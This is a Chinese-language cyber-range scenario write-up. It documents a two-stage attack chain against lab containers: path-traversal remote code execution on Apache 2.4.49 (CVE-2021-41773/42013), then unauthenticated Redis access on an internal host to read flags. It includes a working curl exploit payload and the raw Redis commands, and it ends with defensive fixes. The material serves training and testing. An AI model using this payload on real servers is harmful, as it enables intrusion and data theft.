# 漏洞演练想定：双阶段 RCE 穿透链（无弱口令版）

> 平台：CORE 9.2.1（CORE DockerNode）+ 自建靶标镜像（借鉴 CSLE base→derived 模式）
> 状态：**已实跑验证成功**（2026-11-10，CORE 会话 1，全程真实攻击流量）

## 1. 拓扑与编址

```
 attacker(10.0.0.10) ── fw1(10.0.0.1) ── dmz-host(10.0.2.20)   [DMZ 网段 10.0.2.0/24]
   netns PC 节点          netns 路由节点           docker: target-dmz:v1
   (宿主 rootfs 工具)     (ip_forward+iptables)    └── inner-host(10.0.1.20)  [内网网段 10.0.1.0/24]
                                                  docker: target-inn:v1
```

- fw1 防火墙策略（FORWARD 链）：ESTABLISHED 放行 / `10.0.2.20`(DMZ) 出站放行 / `→10.0.2.20:80` 放行 / **其余全部 DROP**
- 靶标镜像：`target-dmz:v1`（httpd 2.4.49，带 CVE-2021-41773/42013）、`target-inn:v1`（nginx + Redis 无密码）

## 2. 攻击链（全部实跑成功）

| 步骤 | 动作 | 证据 |
|:--|:--|:--|
| ⓪ 边界负向验证 | attacker 直连内网 10.0.1.20:80/21 | 超时挂起（DROP）✓ 证明必须先打穿 DMZ |
| ① 侦察 | nmap 扫 10.0.2.20 | 80/tcp **open** Apache httpd 2.4.49；其余 filtered |
| ② 破防 DMZ | **CVE-2021-41773/42013** 路径穿越 RCE：`curl --path-as-is -d 'echo;id' /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh` | `uid=1(daemon)` ✓ 命令执行确认 |
| ③ 读旗标 1 | 同通道 `cat /flag1.txt` | `FLAG{41773_traversal_dmz_pwned}` ✓ |
| ④ 横移 | 在 DMZ 容器内 `curl http://10.0.1.20/` | `200 (nginx)` ✓（防火墙仅允许 DMZ 出站→此通道是打穿后才有） |
| ⑤ 破防内网 | **Redis 未授权访问**（6379 无密码）：PING/KEYS/GET 经 nc 裸协议 | `+PONG`、`KEYS *` 列出业务键 ✓ |
| ⑥ 窃取数据 | `GET mail:session:secret` / `GET mail:user:admin` | `FLAG{redis_unauth_pivot_stage2}`、`backup-key-2026` ✓ |

> 设计变更记录：原计划 ProFTPD mod_copy 写 web 根（CVE-2015-3306 思路），实测 Redis 7.x 将 `CONFIG SET dir/dbfilename` 列入**保护配置**（can't set protected config）——经典写文件路径被堵，改为**未授权数据窃取**路径（真实影响等价：业务数据直接被拿走）。

## 3. 攻防要点

- **无弱口令**：全程未使用任何口令/凭据，两个阶段均为漏洞/错配利用
- **难度分级**：两段利用分别位于不同网段，防火墙策略强制"先 DMZ 后内网"，攻击者必须串起完整链
- **可复现**：`core_run.py`（一键部署+路由+防火墙+旗标）→ `00_negative.sh` → `01_recon.sh` → `02_exploit_dmz.sh` → `03_pivot.sh`
- **蓝方视角改进项**：DMZ 上的 ES→Apache 升级版即可堵 41773；内网 Redis 加 `requirepass` + 保护配置默认即堵未授权窃取
